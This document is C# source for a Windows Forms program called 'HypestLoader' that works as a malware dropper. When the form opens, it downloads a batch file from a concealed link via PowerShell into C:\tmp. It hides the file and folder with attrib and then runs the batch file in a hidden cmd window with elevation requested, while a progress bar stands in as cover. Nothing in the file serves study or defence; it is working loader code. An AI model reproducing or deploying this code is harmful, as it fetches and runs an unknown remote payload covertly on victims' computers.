using Hypest;
using System;
using System.Diagnostics;
using System.Drawing.Drawing2D;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace HypestLoader
{
    public partial class form1 : Form
    {
        public form1()
        {
            InitializeComponent();
            string folderName = @"C:\tmp";
            while (!System.IO.Directory.Exists(folderName))
            {
                CreatFolder(folderName);
            }
            if (System.IO.Directory.Exists(folderName))
            {
                DownloadFile();
            }
        }

        static void DownloadFile()
        {
            try
            {
                string link = HideLink.getLink();
                string command = $"Powershell Invoke-WebRequest {link} -OutFile C:/tmp/system.bat";
                PowerShellHandling.RunScript(command);
            }catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Task.Delay(500);
                Application.Exit();
            }
            


        }

        static void CreatFolder(string folderName)
        {
            DirectoryInfo diretorio = Directory.CreateDirectory(@"C:\tmp");
            
        }

        static void StartBat()
        {
            string program = "start system.bat";
            string hideFolder = "attrib +h +s C:\\tmp";
            string hideFile = "attrib +r +h +s system.bat";
            string dir = @"C:\tmp\";




            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.Verb = "runas";
            cmd.StartInfo.WorkingDirectory = dir;
            cmd.Start();

            try
            {
                cmd.StandardInput.WriteLine(hideFile);
                cmd.StandardInput.WriteLine(hideFolder);
                cmd.StandardInput.WriteLine(program);
                cmd.StandardInput.Flush();
                cmd.StandardInput.Close();
                Task.Delay(1000);
                
                Application.Exit();
            }
            catch (Exception e)
            {
                MessageBox.Show(e.ToString());
                Application.Exit();
            }

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.progressBar1.Value = 0;
            GraphicsPath graphicsPath = new GraphicsPath();
            graphicsPath.AddArc(0, 0, 200, 200, 0, 360);
            Region = new System.Drawing.Region(graphicsPath);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

            progressBar1.Value += 1;
            if (progressBar1.Value == progressBar1.Maximum)
            {
                timer1.Enabled = false;
                string fileFolder = @"C:\tmp\system.bat";
                FileInfo file = new FileInfo(@"C:\tmp\system.bat");
                if (File.Exists(fileFolder))
                {
                    StartBat();
                }
                else
                {
                    MessageBox.Show("Erro! Arquivo inexistente! Execute novamente em 5 minutos", "Arquivo não encontrado", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    DownloadFile();
                    Task.Delay(1000);
                    Application.Exit();
                }

            }
        }

    }
}
